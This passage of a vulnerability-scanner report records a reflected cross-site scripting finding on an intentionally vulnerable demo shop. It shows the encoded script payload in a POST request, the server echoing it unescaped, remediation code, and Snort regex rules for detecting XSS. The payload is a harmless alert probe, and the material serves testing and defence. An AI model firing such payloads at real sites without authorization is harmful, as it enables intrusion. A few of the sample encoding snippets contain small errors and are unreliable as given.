X-Scan-Memo: Category="Audit.Attack";SID="DEF752D0BB9EFF560CDBB1A2C40CD018";PSID="8AB46678D45BFB0E0CBE10DCFD48EF15";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="searchFor";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2537%2537%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="48";tt="40";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="0bf85c19";
X-Request-Memo: ID="edfededf";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

searchFor=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%37%31%37%29%3c%2f%73%43%72%49%70%54%3e&goButton=go]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2338" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="DEF752D0BB9EFF560CDBB1A2C40CD018"><![CDATA[POST /search.php?test=query HTTP/1.1
Referer: http://php.vulnweb.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="DEF752D0BB9EFF560CDBB1A2C40CD018";PSID="8AB46678D45BFB0E0CBE10DCFD48EF15";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="searchFor";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2537%2537%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="48";tt="40";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="0bf85c19";
X-Request-Memo: ID="edfededf";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

searchFor=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%37%31%37%29%3c%2f%73%43%72%49%70%54%3e&goButton=go]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:50 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4803

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345<sCrIpT>alert(77717)</sCrIpT></h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="DEF752D0BB9EFF560CDBB1A2C40CD018"><Method>POST</Method><Path>/</Path><File>search</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>test=query</FullQuery><FullPostData>searchFor=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%37%31%37%29%3c%2f%73%43%72%49%70%54%3e&amp;goButton=go</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>test</Name><Value>query</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>114</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="DEF752D0BB9EFF560CDBB1A2C40CD018";PSID="8AB46678D45BFB0E0CBE10DCFD48EF15";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="searchFor";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2537%2537%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="48";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="45";smi="0";sc="1";ID="0bf85c19";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="edfededf";sc="1";tid="48";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345<sCrIpT>alert(77717)</sCrIpT></h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
